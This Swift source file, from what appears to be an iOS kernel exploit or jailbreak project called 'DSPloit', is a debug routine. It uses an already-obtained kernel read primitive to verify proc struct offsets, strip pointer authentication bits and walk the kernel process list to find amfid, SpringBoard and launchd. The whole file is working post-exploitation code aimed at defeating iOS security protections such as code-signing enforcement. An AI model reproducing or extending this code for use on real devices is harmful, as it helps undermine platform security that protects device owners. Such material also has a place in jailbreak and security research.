//
//  exp_proc_list_debug.swift
//  DSPloit
//
//  Debug proc list traversal — find correct offsets
//  The proc list walker fails to find amfid because offsets may be wrong.
//  This experiment dumps raw kernel memory to identify correct offsets.
//
//  Created by Royan | 2026-05-30
//

import Foundation

final class ExpProcListDebug {
    static let shared = ExpProcListDebug()
    
    func runAll() -> [String] {
        var log: [String] = []
        
        guard ds_is_ready() else { return ["❌ KRW not active"] }
        
        log.append("══ Proc List Debug ══")
        log.append("")
        
        let kernProc = ds_get_kern_proc()
        let ourProc = ds_get_our_proc()
        log.append("kern_proc: 0x\(String(format: "%llx", kernProc))")
        log.append("our_proc:  0x\(String(format: "%llx", ourProc))")
        log.append("")
        
        // Current offsets
        log.append("── Current Offsets ──")
        log.append("off_proc_p_list_le_next: 0x\(String(format: "%x", off_proc_p_list_le_next))")
        log.append("off_proc_p_pid: 0x\(String(format: "%x", off_proc_p_pid))")
        log.append("off_proc_p_name: 0x\(String(format: "%x", off_proc_p_name))")
        log.append("")
        
        // Verify our_proc is valid by reading our PID
        let ourPid = getpid()
        let kernPidRead = ds_kread32(ourProc + UInt64(off_proc_p_pid))
        log.append("── Verify our_proc ──")
        log.append("actual PID: \(ourPid)")
        log.append("kernel PID (off 0x\(String(format:"%x",off_proc_p_pid))): \(kernPidRead)")
        
        if kernPidRead != ourPid {
            log.append("❌ PID MISMATCH — off_proc_p_pid is WRONG")
            log.append("Scanning for our PID in proc struct...")
            // Scan first 0x200 bytes for our PID
            for off in stride(from: 0, to: 0x200, by: 4) {
                let val = ds_kread32(ourProc + UInt64(off))
                if val == UInt32(ourPid) {
                    log.append("  ✅ Found PID at offset 0x\(String(format:"%x", off))")
                }
            }
        } else {
            log.append("✅ PID matches at offset 0x\(String(format:"%x",off_proc_p_pid))")
        }
        log.append("")
        
        // Read our proc name
        log.append("── Verify proc name ──")
        var nameBytes = [UInt8](repeating: 0, count: 32)
        for i in 0..<4 {
            let chunk = ds_kread64(ourProc + UInt64(off_proc_p_name) + UInt64(i * 8))
            withUnsafeBytes(of: chunk) { buf in
                for j in 0..<8 where i*8+j < 32 { nameBytes[i*8+j] = buf[j] }
            }
        }
        let name = String(bytes: nameBytes.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
        log.append("name at off 0x\(String(format:"%x",off_proc_p_name)): '\(name)'")
        
        if !name.contains("DSPloit") && !name.contains("lara") && !name.contains("dsploit") {
            log.append("⚠️ Name doesn't match — scanning...")
            for off in stride(from: 0x100, to: 0x400, by: 8) {
                var scan = [UInt8](repeating: 0, count: 16)
                let v1 = ds_kread64(ourProc + UInt64(off))
                let v2 = ds_kread64(ourProc + UInt64(off + 8))
                withUnsafeBytes(of: v1) { for j in 0..<8 { scan[j] = $0[j] } }
                withUnsafeBytes(of: v2) { for j in 0..<8 { scan[8+j] = $0[j] } }
                let s = String(bytes: scan.prefix(while: { $0 >= 0x20 && $0 < 0x7f }), encoding: .ascii) ?? ""
                if s.count >= 3 && (s.contains("lara") || s.contains("DSP") || s.contains("dsp")) {
                    log.append("  ✅ Found name '\(s)' at offset 0x\(String(format:"%x", off))")
                }
            }
        } else {
            log.append("✅ Name matches")
        }
        log.append("")
        
        // Try to traverse proc list
        log.append("── Proc List Traversal ──")
        let nextPtr = ds_kread64(kernProc + UInt64(off_proc_p_list_le_next))
        log.append("kern_proc + 0x\(String(format:"%x",off_proc_p_list_le_next)) = 0x\(String(format:"%llx", nextPtr))")
        
        // Also try from our_proc
        let ourNext = ds_kread64(ourProc + UInt64(off_proc_p_list_le_next))
        let ourPrev = ds_kread64(ourProc + 0x8) // le_prev is typically at +0x8
        log.append("our_proc + 0x0 (next) = 0x\(String(format:"%llx", ourNext))")
        log.append("our_proc + 0x8 (prev) = 0x\(String(format:"%llx", ourPrev))")
        
        // Scan our_proc first 0x20 bytes for kernel pointers (find list links)
        log.append("")
        log.append("── Scanning our_proc[0..0x100] for proc-like pointers ──")
        log.append("(Looking for pointers where target+0x60 has valid PID)")
        log.append("")
        
        // PAC strip: on A12+ kernel pointers have PAC bits
        // Try multiple strip strategies
        let pacMasks: [UInt64] = [
            0x0000007FFFFFFFFF, // T1SZ=25 (39-bit VA)
            0x00000FFFFFFFFFFF, // T1SZ=17 (47-bit VA)
            0x0000FFFFFFFFFFFF, // 48-bit
            0xFFFFFFFFFFFFFFFF, // no strip (maybe no PAC on this field)
        ]
        
        // Also try with kernel upper bits forced
        func stripPAC(_ ptr: UInt64) -> UInt64 {
            if ptr == 0 { return 0 }
            // If top byte is 0xFF, it's likely a kernel pointer with PAC
            // Strip to get canonical kernel address
            // Kernel VA on iOS: 0xfffffff0_00000000 base
            // With PAC: top bits get mangled
            // Strategy: OR with 0xfffffff000000000 after masking lower bits
            let lower = ptr & 0x0000007FFFFFFFFF
            let asKern = lower | 0xfffffff000000000
            return asKern
        }
        
        for off in stride(from: 0, to: 0x100, by: 8) {
            let raw = ds_kread64(ourProc + UInt64(off))
            if raw == 0 { continue }
            
            // Try raw first
            var found = false
            let candidates = [raw, stripPAC(raw)]
            
            for candidate in candidates {
                if candidate > 0xfffffff000000000 && candidate < 0xfffffffffff00000 
                   && candidate != ourProc && candidate != kernProc {
                    let targetPid = ds_kread32(candidate + 0x60)
                    if targetPid > 0 && targetPid < 65535 && targetPid != ourPid {
                        log.append("  ✅ off 0x\(String(format:"%02x",off)) → pid=\(targetPid) (raw=0x\(String(format:"%llx",raw)))")
                        found = true
                        break
                    }
                }
            }
            
            if !found && off < 0x20 {
                // Log first few entries even if not proc
                log.append("  off 0x\(String(format:"%02x",off)) = 0x\(String(format:"%llx",raw))")
            }
        }
        
        if nextPtr == 0 || nextPtr == kernProc {
            log.append("")
            log.append("kern_proc next is NULL — trying PAC-stripped from our_proc...")
            
            // Try PAC-stripped our_proc next
            func stripPACk(_ ptr: UInt64) -> UInt64 {
                if ptr == 0 { return 0 }
                let lower = ptr & 0x0000007FFFFFFFFF
                return lower | 0xfffffff000000000
            }
            
            let strippedNext = stripPACk(ourNext)
            let strippedPrev = stripPACk(ourPrev)
            log.append("PAC-stripped next: 0x\(String(format:"%llx", strippedNext))")
            log.append("PAC-stripped prev: 0x\(String(format:"%llx", strippedPrev))")
            
            // Check if stripped pointers are valid procs
            for (label, ptr) in [("next", strippedNext), ("prev", strippedPrev)] {
                if ptr > 0xfffffff000000000 && ptr < 0xfffffffffff00000 && ptr != ourProc {
                    let pid = ds_kread32(ptr + 0x60)
                    if pid > 0 && pid < 65535 {
                        log.append("✅ \(label) → pid=\(pid) — PAC strip WORKS!")
                        
                        // Walk the list!
                        log.append("")
                        log.append("Walking proc list (PAC-stripped)...")
                        var current = ptr
                        var count = 0
                        while current != 0 && current != ourProc && count < 50 {
                            count += 1
                            let p = ds_kread32(current + 0x60)
                            var nb = [UInt8](repeating: 0, count: 16)
                            let v = ds_kread64(current + UInt64(off_proc_p_name))
                            let v2 = ds_kread64(current + UInt64(off_proc_p_name) + 8)
                            withUnsafeBytes(of: v) { for j in 0..<8 { nb[j] = $0[j] } }
                            withUnsafeBytes(of: v2) { for j in 0..<8 { nb[8+j] = $0[j] } }
                            let pn = String(bytes: nb.prefix(while: { $0 >= 0x20 && $0 < 0x7f }), encoding: .ascii) ?? "?"
                            
                            if count <= 20 || pn.contains("amfi") || pn.contains("spring") {
                                log.append("  [\(count)] pid=\(p) '\(pn)'")
                            }
                            
                            let rawNext = ds_kread64(current + 0x0)
                            current = stripPACk(rawNext)
                            if current == ourProc || current == kernProc { break }
                        }
                        log.append("  total: \(count) procs")
                        break
                    }
                }
            }
        } else {
            log.append("✅ Next pointer valid: 0x\(String(format:"%llx", nextPtr))")
            
            // Walk a few entries
            var current = nextPtr
            var count = 0
            while current != 0 && current != kernProc && count < 30 {
                count += 1
                let pid = ds_kread32(current + UInt64(off_proc_p_pid))
                
                // Read name
                var nb = [UInt8](repeating: 0, count: 16)
                let v = ds_kread64(current + UInt64(off_proc_p_name))
                let v2 = ds_kread64(current + UInt64(off_proc_p_name) + 8)
                withUnsafeBytes(of: v) { for j in 0..<8 { nb[j] = $0[j] } }
                withUnsafeBytes(of: v2) { for j in 0..<8 { nb[8+j] = $0[j] } }
                let pname = String(bytes: nb.prefix(while: { $0 >= 0x20 && $0 < 0x7f }), encoding: .ascii) ?? "?"
                
                if count <= 10 || pname.contains("amfi") || pname.contains("spring") || pname.contains("launch") {
                    log.append("  [\(count)] pid=\(pid) name='\(pname)'")
                }
                
                current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
            }
            log.append("  ... total \(count) procs walked")
            
            if count == 0 {
                log.append("❌ Could not walk any procs — offset likely wrong")
            }
        }
        log.append("")
        
        // Summary
        log.append("══ Summary ══")
        if kernPidRead == ourPid {
            log.append("✅ off_proc_p_pid correct")
        } else {
            log.append("❌ off_proc_p_pid WRONG — fix needed")
        }
        
        return log
    }
}
